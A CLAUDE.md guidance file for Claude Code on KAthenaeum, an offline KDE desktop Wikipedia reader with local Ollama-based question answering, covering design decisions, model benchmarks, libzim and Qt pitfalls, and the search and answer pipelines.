# CLAUDE.md

Guidance for Claude Code when working in this repository.

## What this project is

KAthenaeum: a native KDE / Qt desktop version of [Athenaeum](https://github.com/pacificnm/Athenaeum) (offline Kiwix Wikipedia library + local RAG research assistant with app-computed citations), **built for laptops running small local models**. Athenaeum is a FastAPI + React web app for a home server with a prebuilt vector index; this is a single-user desktop application with no index to build.

**Read Athenaeum's [CLAUDE.md](https://github.com/pacificnm/Athenaeum/blob/main/CLAUDE.md) before designing any subsystem** (locally `../Athenaeum/CLAUDE.md` when the two are checked out side by side). It records what was measured, what failed and why. Its "ZIM-search mode" section is the closest thing to this app's whole design. The lessons below are the ones that carry over.

## Status

Working (2026-10-19): the **Library Manager** (catalog, downloads, installed libraries), **reading** (library home, A to Z, article reader with images), **search** (titles as you type, then the text of every article through the ZIMs' own indexes, across all libraries or one), **Ask** (answers from the libraries with app-computed citations, follow-ups, saved chats, a Chats list, model settings) **Ask about this article** (a chat panel beside every article, answering from that article alone), **research projects** (sources, excerpts with notes, the project chat, Markdown documents with citing and export, AI drafts, saved excerpts highlighted in their articles, source notes in a document's preview), and **offline maps** (regions chosen in Settings; a click on a place opens its Wikipedia article: see "Maps"). Every feature of Athenaeum's that applies to a desktop app is now ported. A full review (security, core, data, UI; four independent reviewers, 2026-10-19) was run and its findings fixed: see "Audit fixes". Repository: https://github.com/pacificnm/KAthenaeum (local commits not pushed yet).

## Decisions made

- **Target: laptops with small AI models.** Everything must work on an iGPU or CPU with models of a few GB. No step may need hours or days of batch work before the app is useful.
- **No vector index: no PostgreSQL, no pgvector, no intro or full index.** Building one takes too much disk space and time (Athenaeum measured days to months for English Wikipedia, hundreds of GB for a full index). Every library is searched and read through the ZIM itself, exactly as Athenaeum's ZIM-search mode does. Don't add a persistent passage index or a database server without asking.
- **SQLite for user data**: chats and messages, research projects, saved excerpts and notes, documents, settings, the installed-library list and download state. One file in the user's data directory (`QStandardPaths::AppDataLocation`). Embeddings needed for user data (saved excerpts) are small and stored as blobs next to the row they belong to, together with the name of the model that made them.
- **ZIM access: the libzim C++ library, directly** (`zim::Archive` for entries and items, `zim::SuggestionSearcher` for title suggestions, `zim::Searcher` for Xapian full-text). Athenaeum's Python code used python-libzim, a wrapper around the same library, so its behaviour notes apply unchanged. No kiwix-serve, and no going through Athenaeum's FastAPI backend: this is a native C++ application.
- **Ollama is installed locally on this machine** and is the model server, reached over its HTTP API at `http://localhost:11434` (streaming `/api/chat`, `/api/embed`, plus `/api/tags`, `/api/show`, `/api/pull` for the Models page). The URL is a setting, never hard-coded.
- **No separate admin UI, and no login.** Everything that was Athenaeum's admin area (catalog, downloads, library manager, models, log viewer) is an ordinary part of the application, in its main window or in the Settings dialog. There are no admin accounts, passwords, sessions or login throttling. Don't add them back. Destructive actions (delete a library) still ask for confirmation.
- **Browsing a library needs nothing built: everything comes from the ZIM itself.** No topic clustering, no stored article list.
  - **Library home:** title, description, creator, date, language, article count and illustration from the ZIM's metadata (`zim::Archive::getMetadata`, `getIllustrationItem`, `getArticleCount`), plus a search box, Random article, recently read articles from this library, and its hub articles. Never the ZIM's own main page (on selection ZIMs it is just the first ~100 titles alphabetically).
  - **A-Z:** paged straight from the ZIM's title order (`iterByTitle`, and `findByTitle(prefix)` to jump to a letter), so it costs nothing up front and scales to English Wikipedia. **Verified on real ZIMs (libzim 9.2.3, 2026-10-19):** `iterByTitle` yields exactly the front articles (`getArticleCount()`; no images, CSS or JS) **but includes redirects, which were 78% of them** in `chemistry_mini` (33,926 of 43,239; 9,313 real articles), so skip `isRedirect()` entries. Mwoffliner ZIMs have no Category:/Template: pages; titles with a colon ("Chemistry: A European Journal") are real articles, so do not filter on colons. Skip "(disambiguation)" pages. Title order is case-sensitive byte order (UTF-8): `findByTitle` is a case-sensitive prefix match (`"a"` found nothing, `"A"` found 3,672 entries), and quotes, digits and punctuation sort before `A` while lowercase, accented (`É…`) and emoji titles sort after `Z`. Buckets: A-Z from `findByTitle("<letter>")`, and `#` for everything else (before `A` and after `Z`). Page with a cursor (the last title shown, then `findByTitle(cursor)` and skip past it): resuming a page took 0.01 ms. Never compute page *N* by counting from the start. A full title scan took 21 ms for 43,239 entries, so per-letter counts for a big ZIM (~10 s for English Wikipedia's ~20M title entries, estimated) should be computed in the background and cached in SQLite.
  - **Random article:** `getRandomEntry()` returns redirects as often as the title list holds them (4 of 4 in a first try; 4.6 draws per real article on average), so draw again until `!isRedirect()` (cap the attempts). Do not follow the redirect instead: that favours articles with many alternative names.
  - **Hub articles:** Wikipedia's own curated overview pages, already in the ZIM as ordinary articles, found by title prefix: "Outline of …", "List of …", "Index of …", "Glossary of …", "Timeline of …" (skip redirects). `chemistry_mini` has 4 Outline, 148 List, 1 Index, 2 Glossary and 6 Timeline articles; the 340-article `ray-charles` ZIM has 3 List and nothing else, so the home page must read well with few or none, and a big ZIM will have thousands of "List of" pages (page them). The prefix match is literal: "Index of Hydrogen Deficiency" is a redirect, not an index.
- **Default models: `qwen3.5:2b` for answers, `nomic-embed-text` for embeddings and citations**, both changeable in Settings. Chosen on measurements on this laptop; see "Models".
- **Packaging: a `.deb` for now** (Debian 13 first; Flatpak maybe later). Build it from the CMake project with CPack's DEB generator unless that proves too limited. Runtime dependencies come from Debian's own packages (Qt 6, KF6, Kirigami, libzim, SQLite) and `aria2` is a hard dependency. **Ollama is not in Debian**, so it cannot be a package dependency: the app must detect a missing or unreachable Ollama and explain how to install it, and still read and search libraries without it. Install a `.desktop` file, an AppStream metainfo file and icons in the standard places.
- **Its own git repository**: https://github.com/pacificnm/KAthenaeum (public, branch `main`), separate from Athenaeum's. Refer to Athenaeum by its URL, not a relative path.
- **Fully offline**, as in Athenaeum: no hosted LLM or embedding APIs, ever, as a default or an option.
- **Maps are downloaded, then offline** (KAthenaeum's addition, 2026-10-19): the map of a region is cut from Protomaps' daily planet build (PMTiles, OpenStreetMap data) and the places with Wikipedia articles come from Geofabrik's OpenStreetMap extracts. Those two hosts, over https, are the only ones maps are fetched from (`MapCatalog::isAllowedUrl`); browsing and clicking never touch the network. Drawn by MapLibre Native for Qt (not in Debian: built from source, shipped in the package's private folder).

## How a question is answered (carried over from Athenaeum's ZIM-search mode)

- **Find articles** per library, rank-fused (RRF, k=60): the exact title as typed and case variants (ZIM titles are case-sensitive), runs of 1 to 4 words of the question as exact titles ("boiling point"), the title suggestion index (skipped for question-form queries), and Xapian full-text on the content words with widening: every word, then every word but one, then each word alone. **libzim's query parser has no `OR`** (the word is dropped silently) and ANDs every word, so a natural question matches nothing without this. Strip filler words ("why", "does", "work"); skip Category:/Template: and "(disambiguation)" pages.
- **Passages**: read the best ~6 articles from the ZIM, cut them into passages, keep each article's best 6 by word overlap (always the introduction), embed at most 40 with the document prefix, and rank by similarity fused with overlap (RRF). With no embedding model, rank by words alone and mark the answer degraded. Measured here: 0.3 to 1.1 s to embed, including bringing the embedding model back (see "Ask").
- **Infobox facts (KAthenaeum's addition):** each article's first infobox becomes a "Key facts" passage after the introduction. Without it, "What is the boiling point of ethanol?" was refused with the Ethanol article in the prompt: mini libraries are introductions plus infoboxes, and the extractor drops every table.
- **Passage vectors live in memory only**, for the length of the answer: they are what the citations are matched against.
- **Known weakness**: keyword recall only. "Why is the sky blue" finds articles titled "Sky blue", not Rayleigh scattering. Any improvement must be cheap at question time, not a prebuilt index.

## Models (configurable in Settings)

**Defaults (decided): answer `qwen3.5:2b` (send `think: false`), embedding `nomic-embed-text`.** Both are changeable in Settings. Alternative answer model `llama3.2:3b` (tied on quality, terser answers); "better but slower" option `qwen3.5:4b`. Never `ministral-3:3b` (answers from memory).

Measured on this laptop, 2026-10-19 (scripts and logs were in the session scratchpad; rerun them before changing defaults):

**Answer models**, 17 questions on real Wikipedia text (13 articles' first 2,600 characters, three numbered sources per question, ~2,000 tokens), Athenaeum's own system prompt and refusal detector, `num_ctx` 6144, `temperature` 0.2, one run each. 12 questions the sources answer, 5 they do not (the answer is common knowledge, so a model answering from memory shows up):

| Model | Size | Answered right | Said "not in the sources" | Answered from memory | Reading the prompt | Writing | Average answer |
|---|---|---|---|---|---|---|---|
| `qwen3.5:2b` | 2.7 GB | 12/12 | 5/5 | 0 | 2.4 s | 12.3 tok/s | 8.4 s |
| `llama3.2:3b` | 2.0 GB | 12/12 | 5/5 | 0 | 4.0 s | 12.9 tok/s | 5.3 s |
| `qwen3.5:4b` | 3.3 GB | 12/12 | 5/5 * | 0 | 10.7 s | 7.9 tok/s | 19.4 s |
| `ministral-3:3b` | 3.0 GB | 12/12 | 2/5 | **3** | 4.7 s | 12.4 tok/s | 8.9 s |
| `qwen3.5:9b` | 6.6 GB | 11/12 | 5/5 | 0 | 16.7 s | 4.9 tok/s | 31.4 s |

\* The detector scored it 4/5, but its answer ("The provided sources do not state the boiling point…") was a correct refusal: **Athenaeum's refusal regex misses "do not state" (and "give", "list", "specify")**. Widen it in KAthenaeum. `qwen3.5:9b`'s miss: it said the sources had no date for the Berlin Wall's fall, then quoted 9 November 1989 from them. `ministral-3:3b` answered ethanol's boiling point, the Titanic and Marie Curie from memory: **never a default.**

- **Reading the prompt is what the user waits for**, before the first word appears. `qwen3.5:2b` reads ~2,000 tokens in 2.4 s against 4.0 s for `llama3.2:3b` (Qwen3.5's hybrid attention reads faster) but writes longer answers. Keep the source budget at about 8,000 characters and show progress ("Reading 5 sources…").
- 9B models are 3 to 4 times slower: never the default.
- The test is easy (facts in introductions, one run each). Before shipping, add harder questions (facts deep in long articles, two-article questions, follow-ups) once real ZIM passages are available.
- Model load from disk: 3 to 4 s for a 3B on first use.

**Embedding (`nomic-embed-text`, 274 MB, 768 dimensions):**

- Speed: 39 passages of ~800 characters in 1.2 s (the ~40 passages per answer), one question in 0.04 s.
- **Citation thresholds hold:** 13 true sentences each matched their own article first (13/13); best similarity to their own article was 0.78 to 0.91, to any other article 0.61 to 0.70 (median 0.64). Athenaeum's `SUPPORT_MIN` 0.68 and citation threshold 0.70 sit in that gap, so keep them for nomic. Any other embedding model needs them re-measured.
- **Model swapping:** this machine's Ollama runs with `OLLAMA_MAX_LOADED_MODELS=1`, so each question swaps embedding model -> answer model -> embedding model (for citations). Measured cost: ~1.5 s to bring back the answer model (2.8 s the first time), ~0.4 s for the embedding model, so **about 2 s added to every question**. **Plan: run Ollama with 2 loaded models** (both fit easily), which removes this. The answer-model timings above were taken with the model already loaded (no embedding calls in between), so they are what a question costs once both models stay loaded; today each question adds the ~2 s of swapping on top. Tuning Ollama is deferred until the app works; re-measure then. The app cannot change the service: after an answer, Settings checks `/api/ps` and, if the answer model was unloaded, explains how to raise the limit (`sudo systemctl edit ollama`, `Environment="OLLAMA_MAX_LOADED_MODELS=2"`). It fired on this machine (2026-10-19), which still runs with 1.
- Do not use the `hf.co/...Uncensored...` models as defaults, and HF GGUF pulls of Qwen3.5 need a renderer/parser set or they run on without stopping.

## Other lessons that must carry over

- **Citations are computed by the app, never by the model.** Embed each answer sentence and match it to the passages that were in the prompt; the best source (and a near tie) becomes the chip. Asking a 3B model to cite made answers worse. Refusals ("I could not find...") get no chips.
- **Unsupported-sentence flags:** best similarity below `SUPPORT_MIN` (0.68 with nomic; re-measure for another embedding model) = topic flag; a figure (>1 digit) found in no source = number flag. It is a "verify this" hint, not a fact-checker.
- **Merge results from different retrievers by rank (RRF), never by raw score.** Raw similarities from different embedding models are not comparable either.
- **Embedding prefixes per model family** (nomic: `search_document: ` / `search_query: `; embeddinggemma, e5, bge, mxbai, arctic have their own; see Athenaeum's `models.py`). Store the model name with every saved vector.
- **Thinking models** need `think: false`, or they spend the token budget on hidden reasoning and return nothing.
- **A download is complete only after verification:** no `.aria2` sidecar, size within the catalog figure (the catalog rounds up to the KiB), opens as a ZIM, internal checksum passes. aria2c must die with its parent (`PR_SET_PDEATHSIG`); a partial download resumes with `-c`.
- **Never render ZIM HTML without sanitising it** (scripts, styles, forms, navboxes, event handlers, risky inline styles dropped; internal links rewritten).
- **Only Wikipedia-style (mwoffliner) ZIMs can be searched and read for answers**; say so plainly for others.
- **Don't send a ZIM's own main page to users as a library home**: on Wikipedia selection ZIMs it is just the first ~100 titles alphabetically.
- Leaving a chat mid-answer must save the partial answer as stopped.

- Build and run: `cmake -S . -B build -G Ninja && cmake --build build && ctest --test-dir build && ./build/bin/kathenaeum`. `.deb`: `cmake --build build --target package`.
- User data: `~/.local/share/kathenaeum/kathenaeum.sqlite` (WAL mode).
- **Database migrations** (`database.cpp`, `migrations`): migration N takes the schema from version N to N+1, tracked in `PRAGMA user_version`, each in one transaction. Never edit a migration that has shipped; append one. QSQLITE runs one statement per `exec()`, so a migration is a list of statements. A database from a newer build is refused rather than touched. Schema v1: `settings`, `libraries`; v2: library metadata columns and `downloads`; v3: `reading_history` (cascades with its library); v4: `chats` and `messages` (an answer keeps its sources, citations and timings as JSON, so a saved chat reads as it did); v5: the article a chat is about (`chats.library_id`, `article_path`, `article_title`; no foreign key, so the chat outlives its library); v6: `projects`, `project_items`, `project_documents`, `chats.project_id`; v7: `removed_libraries` (a removed library's id is never given to another, and the same ZIM added again gets it back); v8: `map_regions`, `map_places` and the R*Tree `map_places_box` (no foreign keys in an R*Tree: its rows are deleted with their places, `MapPlaces::removeRegion`). Add tables when the feature that needs them is built.
- **libzim throws exceptions, and KDE compiles with `-fno-exceptions`.** `kathenaeum_core` enables them (`kde_target_enable_exceptions`); every libzim call must be inside it and caught there, never let a libzim exception reach Qt or QML code.
- **A null `QString` binds as SQL NULL.** Our text columns are `NOT NULL DEFAULT ''`, so binding `QString()` makes the statement fail, silently unless its result is checked (a download stayed "queued" forever because of it). Wrap strings that may be empty in `Database::text()` and check `exec()`.
- **`i18np`'s plural argument must be a number.** Passing a formatted string ("11,901") made every count over 999 read "0 articles". KI18n adds the thousands separator itself.
- **`ComboBox.indexOfValue()` in a `currentIndex` binding is not re-run when the model changes**, so the box showed "All kinds" while filtering on Wikipedia. Compute the index from the model array (`model.findIndex(...)`).
- **moc silently skips a class when the file has raw string literals** (`R"(...)"`, Qt 6.8): the test class got no meta-object and the link failed with "undefined reference to vtable". Use ordinary escaped strings in files with `Q_OBJECT`.
- **An invalid `QRegularExpression` matches nothing, without an error.** `\u2013` is not PCRE (it is `\x{2013}`); the whole pattern failed and nothing was stripped. Every pattern needs a test that exercises it.
- **A layout nested in a `ColumnLayout` fills the height by default.** An empty column of hidden messages took half the Ask page; give such a column `Layout.fillHeight: false`.
- **Resizing the offscreen window mid-run does not relayout what is grabbed** (the screenshot was the old layout squeezed). Start the scratch window at the size to check.
- **Screenshots for UI checks:** `grabToImage` captures on a later frame, so navigating in the same tick photographs the transition (a black page). Take the picture in one timer step and navigate in the next.
- **Screenshots for UI checks (setup):** `QT_QPA_PLATFORM=offscreen`, separate `XDG_DATA_HOME`/`XDG_CACHE_HOME`/`XDG_CONFIG_HOME`, and a scratch copy of `Main.qml` with a `Timer` that drives the pages and calls `pageStack.grabToImage(...)` (the window's own content item has no QML engine and cannot be grabbed). The app is single-instance: make sure it is not already running, or the test copy just raises it and exits.
- The desktop style's `TabButton.qml:22: TypeError: Cannot read property 'y' of null` comes from KDE's style (a `baselineOffset` binding before `contentItem` exists): harmless.
- **Debian ships Qt's private headers separately**, but Qt's QML targets still list their folders, so `-Wno-missing-include-dirs` is set globally.
- `qmllint` (`cmake --build build --target kathenaeum_qmllint`) reports `i18n` and Kirigami grouped properties (`icon.name`) as unqualified/unresolved: false positives in KDE apps. Check pages by opening them instead. Known harmless runtime warnings: "Created graphical object was not placed in the graphics scene" when the page stack swaps pages, and `MessageDialog.qml: Cannot read property 'Success'` from Kirigami Addons' own About page.


## Library Manager (`core/catalog.*`, `core/downloads.*`, `core/library.*`, `librarymanager.*`, `qml/*View.qml`)

- **Catalog:** Kiwix OPDS v2, `https://opds.library.kiwix.org/catalog/v2/entries?lang=eng&count=5000`, one ~1.5 MB response, filtered and sorted locally. Cached in `<CacheLocation>/catalog-eng.xml` (written with `QSaveFile`), used for an hour, and kept when a fetch fails so the catalog works offline (the page says it is showing an older copy). **It is fetched only when the Library Manager page opens**, never at startup. Parsed with `QXmlStreamReader` (no external entities, entity expansion limited: tested with an entity bomb).
- **What the catalog holds** (2026-10-19): 1,312 English entries, only 65 of them Wikipedia; 574 have no category (DevDocs, maps, ...), 357 TED, 181 Stack Exchange. Each library appears once per flavour (mini, nopic, maxi). The Kind filter starts on Wikipedia; other kinds get a notice that they may not be searchable. The `_ftindex:no` tag means the ZIM has no Xapian full-text index, which ZIM search needs: such entries get a warning icon, and installed ones a warning.
- **Downloads:** `aria2c -x8 -s8 -c --file-allocation=none --auto-file-renaming=false --follow-metalink=mem --summary-interval=1 --show-console-readout=false --console-log-level=warn --dir <folder> <url.meta4>`. Verified behaviour with aria2 1.37: `--follow-metalink=mem` leaves no `.meta4` beside the ZIM; progress lines look like `[#85a9a7 1.1MiB/22MiB(5%) CN:1 DL:592KiB ETA:36s]` (the first has no ETA; Kiwix metalinks give `CN:1` whatever `-x` says); **SIGTERM makes aria2c exit 7 and keep its `.aria2` control file, and `-c` resumes from it** (cancel = SIGTERM, so a cancelled download can be resumed); a finished file was 178 bytes smaller than the catalog's figure (rounded up to the KiB). The child gets `PR_SET_PDEATHSIG` via `QProcess::setChildProcessModifier`. Statuses `queued | downloading | verifying | complete | failed | cancelled`; a unique partial index allows one active download per file; rows left active by a previous run become `failed` with "Press Resume" at startup (`reconcile`). Before starting: URL rules, file name rules, not already installed, and free space for what is still to come plus 64 MB.
- **Verification** (`ZimArchive::verify`, in a `QtConcurrent` thread, status `verifying`): no `.aria2` sidecar, size within the catalog figure (up to 1023 bytes smaller), opens as a ZIM, `Archive::check()` passes (reads the whole file: minutes for a big one). A file that fails is deleted and the row says why; it is never registered. Removing a download row never deletes a file that an installed library uses.
- **Installed libraries** (`libraries` table, schema v2): registered by canonical path, so a ZIM can live anywhere (Add File keeps it where it is). Metadata, size and the 48x48 illustration are stored when it is added. A missing file keeps its row (projects may refer to it) and is shown as missing. Remove asks, with "also delete the file" checked for files in the download folder and unchecked for files added from elsewhere. **Updates:** a catalog entry with the same base name (`wikipedia_en_chemistry_mini`) and a newer `YYYY-MM` version than an installed file; the update is an ordinary download beside the old file, which the user then removes.
- **Download folder:** setting `library.folder`, default `<AppDataLocation>/zim` (`~/.local/share/kathenaeum/zim`), shown with free space in the Installed tab and in Settings. Changing it does not move files; libraries keep their paths and the new folder is scanned.
- **Catalog illustrations** are loaded by QML straight from the catalog server; the QML engine's network manager has a 50 MB disk cache (`<CacheLocation>/qml-network`) so they are not fetched again. Installed libraries' illustrations come from the database as `data:` URLs.
- **Checked end to end** in a real (offscreen) run with isolated XDG folders: catalog loaded (1,312 entries, 65 Wikipedia), searched, a real download of the 2 MB Ray Charles library verified and registered, screenshots of every tab reviewed.


## Reading (`core/articlerenderer.*`, `core/zimreader.*`, `zimschemehandler.*`, `articlestore.*`, `librarybrowser.*`, `qml/LibraryPage.qml`, `TitlesPage.qml`, `ArticlePage.qml`)

- **How an article reaches the screen:** a `WebEngineView` loads `zim://lib<libraryId>/<percent-encoded path>`. `ZimSchemeHandler` (installed on the default profile; the scheme is registered before `QtWebEngineQuick::initialize()`) reads the entry with `ZimReader::content` (redirects followed), renders HTML through `ArticleRenderer` into a whole document styled from the desktop palette, and serves images straight from the ZIM. Everything else the ZIM holds (its scripts, stylesheets, raw HTML that is not an article) is refused. No local server, nothing on the network.
- **Defence in depth:** the sanitiser (allowlisted attributes, dropped elements, only `zim:` URLs left), JavaScript off in the view, a CSP `<meta>` (`default-src 'none'; img-src zim:; style-src 'unsafe-inline'`), `localContentCanAccessFileUrls/RemoteUrls: false`, an in-memory HTTP cache and no persistent cookies on the profile. Links to the web (`wl-ext`, `target=_blank`) are refused in the view and opened in the user's browser with a notice; any other scheme goes nowhere.
- **Scheme flags (found the hard way):** `SecureScheme | LocalScheme | LocalAccessAllowed`. Without `LocalAccessAllowed` a `zim:` page cannot embed `zim:` images: only schemes with that flag may load from a `LocalScheme`, and the images were blocked **silently**, before reaching the handler and without a console message, while navigations to `zim:` worked. Tell-tale: the handler logs the page request but no image requests.
- **The renderer** is a port of `render.py` onto libxml2's HTML parser (what lxml uses, so the same tree): root `div.mw-parser-output` (a whole page without it falls back to `<body>`; a bare fragment is refused), same drop list plus `<svg>` and `<textarea>` (MathML `<math>` is kept: it is how formulas come), same attribute allowlist and style filter, images and internal links rewritten to `zim://lib<id>/`, links to articles not in the ZIM become `span.wl-missing`, `href`/`src` only on `a`/`img`, TOC from `h2`/`h3` ids (or the id of the `section` around them). Paths are resolved by hand, not with a URL parser: `Chemistry:_A_European_Journal` is a page, not a scheme (a URL parser, and Athenaeum's `urlsplit`, read `Chemistry:` as one). Test cases from `test_render.py` are ported in `autotests/articlerenderertest.cpp`.
- **libxml2 memory rule:** when dropping XPath matches, decide everything before freeing anything. Matches are in document order, so freeing an outer match (a navbox) frees the inner ones (its script), and even *reading* an inner node afterwards to ask whether it is nested is a use after free. The tests passed without noticing; AddressSanitizer caught it. **Run the core tests under ASan when changing C-level parsing code** (`-DCMAKE_CXX_FLAGS="-fsanitize=address,undefined -fno-omit-frame-pointer"` in a separate build directory).
- **What real mwoffliner pages look like:** internal links are plain relative paths (`Alcohol_(chemistry)`, `Acid_dissociation_constant#Bases_and_basicity`); `<link>`/`<script>` point at `./_res_/` and `./_mw_/` (all dropped); nopic and mini ZIMs use `data:` SVG placeholders for images (dropped); maxi ZIMs keep images under `_assets_/<hash>/<name>.jpg` **stored as `image/webp` despite the name**, and a `%2C` in a file name is literally part of the ZIM path, so the HTML has it encoded again (`%252C`): decode once. The main entry (`mainPage`) redirects to `index`, a custom alphabetical page without `mw-parser-output`.
- **A to Z** (`ZimReader::titles`): positions in title order via `getEntryByTitle(index)` (the same order as `iterByTitle`, checked on 43,239 entries), each letter's start found by binary search on titles (0.04 ms). A letter is its uppercase range then its lowercase range ("pH" under P); `#` is everything before `A`, between `Z` and `a`, and after `z` (digits, punctuation, accented letters, `²H`). Redirects and "(disambiguation)" pages are skipped. A page's `next` is a position, so paging never scans what came before. Prefix lists ("List of …", All…) page the same way over `[lowerBound(prefix), lowerBound(prefix with its last byte + 1))`. Tests check every article lands in exactly one letter and paging loses or repeats nothing.
- **Library home:** metadata and illustration from the database, title suggestions from the ZIM's title index (`SuggestionSearcher`), Random (`getRandomEntry`, drawn again while it returns a redirect), Recently read (`reading_history`, recorded when an article page shows an article), and overview pages found by prefix (Outlines, Indexes, Glossaries, Timelines, Lists; 12 shown, All… opens the full list).
- **Article width:** the whole window by default; Settings › Reading (and "Use the Whole Window" in an article's menu) switches to an 860-pixel column, centred (`reading.width`, `full` | `column`; the stylesheet reads it each time a page is served, and open articles reload). The column was the only layout until 2026-10-19: on a full-screen window it left most of the screen empty, and the user took it for a ZIM limit.
- **Navigation:** `pageStack` is single-column; the header shows the page's title with a back button (`ApplicationHeaderStyle.ToolBar`, `ShowBackButton`). The breadcrumb trail with back and forward arrows was replaced on 2026-10-19 (the user found it dated), together with the sidebar: `qml/Sidebar.qml`, an `OverlayDrawer` with a search box in a bar as tall as the page header, places grouped (Read, Research) and the current section marked (`Main.qml` `section`, set by `show()`; pages pushed on top keep it), a count of running downloads beside Library Manager, beside the pages on a wide window and opened from the header on a narrow one. Ctrl+F goes to its search box. Libraries are cards (`LibrariesPage.qml`); article lists on a library's home are pill chips (`ArticleChip.qml`: the desktop style draws `Kirigami.Chip` as a square grey button). **Buttons:** every push button is `AppButton.qml` (compact, rounded, icon beside the words), of a `kind`: `primary` (the main action of its area, accent-filled: Ask, Read, Download, New Document, Add Article), `secondary` (a soft tint), `flat` (links: Show All, Change…), `danger` (Stop, cancelling a download). It keeps its active colours when disabled and fades instead: Kirigami's disabled colour group turned the accent grey. It keeps its full width beside a stretching label (`Layout.minimumWidth: implicitWidth`; a button that may shrink sets 0). Header actions stay Kirigami actions (flat toolbar buttons); dialog footers keep the style's buttons. Page views switch with `SegmentedTabs.qml` (a rounded track, the chosen segment raised, with icons) instead of `TabBar`. Links inside an article stay in the same page (the view's own Back/Forward); Contents jumps to a section by fragment. A change of colour scheme reloads the article in the new colours.
- **Checked** in an offscreen run (`QT_QUICK_BACKEND=software`, `QTWEBENGINE_CHROMIUM_FLAGS=--disable-gpu`, so `grabToImage` captures the web view) on the chemistry mini and Ray Charles maxi ZIMs: library home, A to Z, Water, Ray Charles with its infobox photo, a jump to "Career", Recently read.


## Search (`core/extract.*`, `core/zimsearch.*`, `searchcontroller.*`, `qml/SearchPage.qml`)

- **What it is:** Athenaeum's ZIM-search mode, ported rule for rule (`terms`, `titleCandidates`, `isQuestion`, `ngramTitles`, `stem`, `overlap`, the per-library lists and their weights: exact title 3, word-run titles 0.8 to 1.2, title-index suggestions 1.5 (not for questions), Xapian every word 1, every word but one 0.6, single words 0.3 when fewer than 5 articles turned up), fused by RRF (k = 60) per library. Snippets: the passage among the first 12 with most of the query's words, cut to 360 characters. Test cases from `test_zimsearch.py` and `test_extract.py` are ported.
- **One addition, measured:** rank fusion is per library, so each library's best article scores alike however loosely it matches. With Chemistry and Ray Charles installed, "why is water polar" put "Ray Charles" first: it contains every word ("water" somewhere, and the Polar Music Prize). Candidates are now re-ranked by **aboutness**: score x (0.25 + the share of the query's words found in the title and introduction, prefix-tolerant so "polar" meets "polarity"); an article the query **names** (exact or word-run title: "Ethanol" in "boiling point of ethanol") counts as fully about it. Both rules are mutation-checked (`anArticleAboutTheQueryBeatsOneThatOnlyMentionsIt`, `anArticleTheQueryNamesStaysFirstEvenIfItsOpeningDoesNot`). An earlier idea, weighting by the strongest list an article came from, did nothing for this case (both articles match every word) and was removed: check a fix against the real failing case, not only a test written for it.
- **Known limit, as in Athenaeum:** keyword recall. "why is water polar" ranks "Water" and "Chemical polarity" 8th and 9th, behind articles that use both words more. Ask's embedding ranking is what fixes question-style queries.
- **Threads:** suggestions are quick and run on the UI thread. A full search (up to a dozen Xapian queries plus reading and extracting each candidate) runs in `QtConcurrent`; the controller drops results from a search that a newer one has replaced. Workers never touch the database: `ZimSearch::prepare` opens the archives on the UI thread, workers use `ZimArchives::opened` (mutex-guarded cache; libzim archives are safe to read from several threads; Searcher and SuggestionSearcher objects are created per call). libxml2 is initialised once on the main thread at startup (`initXmlParser`). Measured: 6 to 130 ms per search over the chemistry mini (43k entries) and Ray Charles ZIMs together.
- **Two kinds of redirect.** Besides the ZIM's own, mwoffliner writes tiny HTML pages that forward to a section of another article (`<meta http-equiv="refresh" content="0;URL='./Cry_(Churchill_Kohlman_song)#Johnnie_Ray_&_The_Four_Lads_version'">`, a few hundred bytes; 11 of 152 "articles" in the Ray Charles nopic ZIM). `ZimReader::content` follows them (up to 4 hops, keeping the fragment), the scheme handler answers with a redirect to the real address and section, search resolves them, and A to Z, Random and overview lists leave them out (only HTML entries of 4 KB or less are looked at).
- **The root element and the drop rules.** Real pages have `<html class="... skin-thumbsize-clientpref-standard ...">`, which the extractor's `contains(@class,'thumb')` rule matches. Dropping it emptied every page; merely counting it among the matches made every table and style "nested" inside a match, so none were dropped (snippets were full of infobox items and CSS). The root is excluded from the matches entirely; lxml's `getparent()` check did the same in Athenaeum. A generated test page did not catch it: the test `realArticlesGivePassages` runs the extractor on real ZIM pages.
- **Pages with no prose are expected:** "Wikipedia does not have an article on…" pointers to Wiktionary and data pages that are all tables (23 of 9,306 articles in chemistry mini). They are left out of search results.
- **Where search is:** "Search" at the top of the sidebar (Ctrl+F), and on a library's home "Search the text of this library for …" (Enter in its box). The Search page has a scope menu (all libraries or one).

## Ask (`core/rag.*`, `core/answerer.*`, `core/ollama.*`, `core/embedding.*`, `core/chats.*`, `conversation.*`, `chatlist.*`, `modelsettings.*`, `qml/AskPage.qml`, `qml/ChatsPage.qml`)

- **One question, in order** (`Answerer`): find and read up to 6 articles (`ZimSearch::readArticles`, worker thread) -> pick passages (`Rag::pickPassages`: each article's best 6 by words, always the introduction, round-robin to 40) -> one `/api/embed` call for the question (`search_query: `) and the passages (`search_document: `) -> rank (`Rag::rank`: RRF of word overlap and similarity, best 14) -> numbered sources (`Rag::buildContext`: at most 5 articles, 2 passages each, 8,000 characters) -> `/api/show` for the model's capabilities (cached; `think: false` only when it has "thinking") -> streamed `/api/chat` (temperature 0.2, `num_ctx` 6144, `num_predict` 700) -> tidy the answer -> embed its sentences -> `Rag::attribute`. Constants are Athenaeum's, in `rag.h`. Without the embedding model: ranked by words, marked degraded, no citations. Without the answer model: the sources are still shown, with the error and the `ollama pull` command.
- **Measured on this laptop** (2026-10-19, `askbench`, chemistry mini + Ray Charles maxi, `qwen3.5:2b` + `nomic-embed-text`, Ollama swapping models): finding and reading articles 0.03 to 0.12 s; embedding 0.3 to 1.1 s (this includes loading the embedding model again after the last answer); **first words after 4.7 to 6.0 s** (loading the answer model again, ~1.5 s, plus reading the prompt); writing at 14 to 18 tok/s; citations 0.4 s; whole answers 9 to 19 s. 9 of 9 answerable questions right (including 4 follow-ups and 3 infobox facts), 2 of 2 questions outside the libraries refused.
- **The model writes source numbers anyway** ("…near the oxygen [3].", "Sources: [1], [3], [5]") although the prompt says not to, and the app's chips came on top. `Rag::tidyAnswer` removes them while streaming and before citations are matched (so offsets match what is shown), and turns "stated in source [3]" into "stated in one source", "sources [1] and [2]" into "the sources".
